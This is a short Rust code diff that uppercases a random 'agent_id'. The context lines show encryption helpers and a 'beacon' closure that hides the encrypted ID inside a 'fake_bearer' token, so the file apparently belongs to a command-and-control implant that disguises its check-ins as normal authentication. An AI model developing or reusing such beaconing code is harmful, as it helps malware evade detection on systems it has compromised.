@@ -30,11 +30,12 @@ fn rsa_encrypt(message: &str) -> Vec<u8> {
 }
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
-    let agent_id: String = rand::thread_rng()
+    let agent_id = rand::thread_rng()
         .sample_iter(&Alphanumeric)
         .take(12)
         .map(char::from)
-        .collect();
+        .collect::<String>()
+        .to_uppercase();
 
     let beacon = || {
         let fake_bearer = BASE64_STANDARD.encode(rsa_encrypt(&aes_encrypt(&agent_id)));
